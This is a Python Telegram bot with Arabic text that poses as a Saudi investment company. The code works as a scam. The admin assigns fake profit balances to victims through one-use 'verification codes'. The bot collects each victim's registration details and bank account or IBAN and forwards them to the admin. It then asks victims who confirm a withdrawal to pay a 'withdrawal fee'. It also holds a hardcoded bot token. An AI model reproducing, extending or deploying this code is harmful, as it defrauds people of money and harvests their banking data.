import logging
import os
import random
import string
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    ApplicationBuilder,
    ContextTypes,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
)

# التوكن المعتمد للبوت
TOKEN = "9056801472:AAHsVQ8Iwl_pa34_4gAYxakvY5y-r-vEjzU"
ADMIN_ID = 7004113433  # معرف الأدمن الخاص بك
SUPPORT_HANDLE = "@AbuAbdulAlziz"

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# قاموس لتتبع حالة كل مستخدم
user_states = {}
# قاموس لحفظ بيانات كل مستخدم شخصياً
user_custom_data = {}

# قاعدة بيانات الأكواد والمبالغ المخصصة للمستخدمين
custom_profits = {
    "354101": {"amount": "45,500", "assigned_user_id": None},
    "00554": {"amount": "45,500", "assigned_user_id": None},
    "189415": {"amount": "1500", "assigned_user_id": None}
}
USED_CODES = set()

def generate_new_code() -> str:
    """توليد معرف عملية جديد وعشوائي وآمن يبدأ بـ 354"""
    chars = string.digits
    return "354" + "".join(random.choices(chars, k=6))

# تقدير عمر الحساب بناءً على الـ ID
def estimate_account_age(user_id: int) -> str:
    if user_id < 10000000:
        return "حساب قديم جداً (من أوائل الحسابات في المنصة)"
    elif user_id < 100000000:
        return "حساب قديم (بين 2014 - 2016 تقريباً)"
    elif user_id < 500000000:
        return "حساب متوسط القدَم (بين 2016 - 2019 تقريباً)"
    elif user_id < 1000000000:
        return "حساب نشط منذ عدة سنوات (بين 2019 - 2022 تقريباً)"
    else:
        return "حساب حديث نسبياً (وتم إنشاؤه في السنوات الأخيرة)"

# أمر الأدمن لتحديد المبلغ ورقم التحقق لزبون معين بدقة:
async def set_profit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return

    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "⚠️ **طريقة الاستخدام غير صحيحة!**\n"
            "اكتب الأمر بهذا الشكل:\n"
            "`/setprofit <معرف_المستخدم> <المبلغ> <رقم_التحقق>`\n\n"
            "مثال:\n`/setprofit 7004113433 45500 00554`",
            parse_mode="Markdown"
        )
        return

    target_user_id = args[0].strip()
    amount = args[1].strip()
    code = args[2].strip()

    custom_profits[code] = {
        "amount": amount,
        "assigned_user_id": int(target_user_id)
    }

    await update.message.reply_text(
        f"✅ **تم تخصيص الأرباح ورقم التحقق بنجاح!**\n\n"
        f"• معرف المستخدم: `{target_user_id}`\n"
        f"• الرصيد/الأرباح: `{amount} ريال`\n"
        f"• رقم التحقق الخاص به: `{code}`\n\n"
        "🔒 هذا الرقم مرتبط به وحده ولا يمكن لأي شخص آخر استخدامه.",
        parse_mode="Markdown"
    )

# أمر عرض الأكواد والمراجع الفعّالة للأدمن
async def admin_get_codes(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    codes_str = ", ".join([f"{code} (مبلغ: {data['amount']})" for code, data in custom_profits.items()])
    await update.message.reply_text(
        f"🔑 **أكواد التحقق الفعّالة ومبالغها الحالية:**\n`{codes_str}`",
        parse_mode="Markdown"
    )

# أمر /start الترحيبي مع معلومات الحساب وزري (سحب) و (الدعم الفني) فقط
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    user_states[user_id] = "waiting_for_subscription_text"
    
    age_estimation = estimate_account_age(user_id)
    
    welcome_msg = (
        f"🌟 أهلاً بك في شركة **تحالف المالية للإستثمار** 🇸🇦\n"
        f"نسعد بانضمامك إلينا لنخطو معاً نحو مستقبل استثماري متميز ومربح.\n\n"
        f"📊 معلومات حسابك:\n"
        f"• معرفك الشخصي (ID): `{user_id}`\n"
        f"• تقدير الحساب: {age_estimation}\n\n"
        f"الرجاء إرسال بياناتك صحيحة (خطوات التسجيل والإشتراك) ليتم التعرف عليك في النظام، أو استخدم الأزرار أدناه:"
    )
    
    keyboard = [
        [InlineKeyboardButton("📤 سحب", callback_data="btn_withdraw")],
        [InlineKeyboardButton("💬 التواصل مع الدعم الفني", url=f"https://t.me/AbuAbdulAlziz")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(welcome_msg, parse_mode="Markdown", reply_markup=reply_markup)

# معالجة الرسائل النصية
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not msg or not msg.text:
        return

    user_id = update.effective_user.id
    username = f"@{update.effective_user.username}" if update.effective_user.username else "بدون معرف"
    text = msg.text.strip()
    current_state = user_states.get(user_id)

    if current_state == "completed":
        await msg.reply_text("لقد أكملت الإجراءات بالفعل ولا داعي للتكرار. يمكنك استخدام الأزرار أو التواصل مع الدعم الفني.")
        return

    # الحالة الأولى: استقبال بيانات التسجيل
    if current_state == "waiting_for_subscription_text":
        if text.startswith("خطوات التسجيل والإشتراك") or text.startswith("خطوات التسجيل والاشتراك") or text.startswith("حساب") or len(text) > 10:
            user_custom_data[user_id] = text
            user_states[user_id] = "waiting_for_code"
            
            await msg.reply_text("✅ تم استقبال بيانات التسجيل بنجاح.\n\nالرجاء إرسال **رقم تحقق الاشتراك** الخاص بك لتتمكن من رؤية رصيدك وأرباحك:")
        else:
            await msg.reply_text("❌ الرجاء إدخال بياناتك صحيحة (مثل بيانات الحساب أو خطوات التسجيل والإشتراك)")
        return

    # الحالة الخاصة بإدخال الحساب البنكي
    if current_state == "waiting_for_bank_account":
        user_states[user_id] = "completed"
        await msg.reply_text("✅ **تم حفظ بيانات الحساب البنكي بنجاح!**\n\nجاري معالجة عملية تحويل الأرباح لحسابك.")
        
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=(
                "🏦 **تم إدخال الحساب البنكي من قبل مستخدم!**\n\n"
                f"• معرف المستخدم: `{user_id}` ({username})\n"
                f"• تفاصيل الحساب البنكي:\n{text}"
            ),
            parse_mode="Markdown"
        )
        return

    # الحالة الثانية: التحقق من رقم التحقق المدخل من الزبون
    if current_state == "waiting_for_code" or text in custom_profits:
        if text in custom_profits:
            code_info = custom_profits[text]
            assigned_id = code_info["assigned_user_id"]
            
            if assigned_id is not None and assigned_id != user_id:
                await msg.reply_text("❌ عذراً، رقم التحقق هذا غير مخصص لحسابك ولا يمكنك استخدامه.")
                return

            profit_amount = code_info["amount"]

            # حرق الكود واستبعاده فوراً
            del custom_profits[text]
            USED_CODES.add(text)
            user_states[user_id] = "viewing_balance"
            
            # توليد رقم تحقق جديد للأدمن
            auto_new_code = generate_new_code()
            custom_profits[auto_new_code] = {"amount": "2000", "assigned_user_id": None}

            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=(
                    "🔑 **تم استهلاك رقم تحقق وإصدار رقم جديد!**\n\n"
                    f"• الرقم المستهلك (المحروق): `{text}`\n"
                    f"• بواسطة المستخدم: `{user_id}` ({username})\n\n"
                    f"🆕 **رقم التحقق الجديد المتجدد لتسليمه للزبون القادم:**\n`{auto_new_code}`"
                ),
                parse_mode="Markdown"
            )

            # الزر في الأعلى وأزرار التأكيد والإلغاء في الأسفل
            keyboard = [
                [InlineKeyboardButton("💳 ادخل حسابك البنكي", callback_data="enter_bank_account")],
                [
                    InlineKeyboardButton("تأكيد السحب", callback_data="withdraw_confirm"),
                    InlineKeyboardButton("إلغاء سحب", callback_data="withdraw_cancel")
                ]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)

            user_specific_data = user_custom_data.get(user_id, "بيانات التسجيل مسجلة بنجاح")

            await msg.reply_text(
                text=(
                    "✅ **تم التحقق من رقم التحقق بنجاح!**\n\n"
                    f"💰 **رصيدك وأرباحك المتاحة:** `{profit_amount} ريال`\n\n"
                    f"إليك بياناتك المسجلة:\n\n{user_specific_data}"
                ),
                reply_markup=reply_markup,
                parse_mode="Markdown"
            )
        else:
            await msg.reply_text("❌ رقم التحقق غير صحيح أو تم استخدامه مسبقاً. يرجى مراجعة الدعم الفني للحصول على رقم صحيح.")
        return

# معالجة الأزرار التفاعلية
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data  
    chat_id = query.message.chat_id
    user = query.from_user
    user_id = user.id
    username = f"@{user.username}" if user.username else "بدون معرف"

    if data == "btn_withdraw":
        withdraw_text = (
            "📤 **طلب سحب الأرباح:**\n\n"
            "• أرسل بياناتك ليتم إنظام (التاكد من اشتراكك) ليتم ظهور لك أزرار تحقق.\n\n"
            f"لأي استفسار إضافي، تواصل مع الدعم الفني: {SUPPORT_HANDLE}"
        )
        keyboard = [[InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_to_main")]]
        await query.edit_message_text(withdraw_text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))

    elif data == "back_to_main":
        user_states[user_id] = "waiting_for_subscription_text"
        main_text = (
            f"🌟 أهلاً بك من جديد في القائمة الرئيسية لشركة **تحالف المالية للإستثمار** 🇸🇦\n\n"
            "اختر أحد الخيارات أدناه أو أرسل بياناتك ورقم التحقق الخاص بك:"
        )
        keyboard = [
            [InlineKeyboardButton("📤 سحب", callback_data="btn_withdraw")],
            [InlineKeyboardButton("💬 التواصل مع الدعم الفني", url=f"https://t.me/AbuAbdulAlziz")]
        ]
        await query.edit_message_text(main_text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))

    elif data == "enter_bank_account":
        user_states[user_id] = "waiting_for_bank_account"
        await query.edit_message_text(
            "💳 **إدخال الحساب البنكي:**\n\n"
            "الرجاء إرسال تفاصيل حسابك البنكي أو رقم الآيبان (IBAN) في رسالة هنا ليتم ربطه بطلب السحب:",
            parse_mode="Markdown"
        )

    elif data == "withdraw_cancel":
        user_states[user_id] = "completed"
        await context.bot.send_message(
            chat_id=chat_id,
            text="تم الإلغاء بنجاح"
        )
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"⚠️ تنبيه: قام المستخدم بإلغاء السحب!\n\n• معرف المستخدم: `{user_id}`\n• اليوزر: {username}",
            parse_mode="Markdown"
        )

    elif data == "withdraw_confirm":
        user_states[user_id] = "completed"
        await context.bot.send_message(
            chat_id=chat_id,
            text="الرجاء دفع رسوم سحب"
        )
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"✅ تنبيه: قام المستخدم بتأكيد السحب (وطُلب منه دفع رسوم سحب)!\n\n• معرف المستخدم: `{user_id}`\n• اليوزر: {username}",
            parse_mode="Markdown"
        )

def main():
    if not TOKEN:
        raise ValueError("❌ خطأ: لم يتم تعيين التوكن في الكود!")
        
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("codes", admin_get_codes))
    app.add_handler(CommandHandler("setprofit", set_profit))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(CallbackQueryHandler(button_handler))

    print("🤖 بوت تحالف المالية للإستثمار يعمل الآن بالأزرار المطلوبة فقط...")
    app.run_polling()

if __name__ == "__main__":
    main()
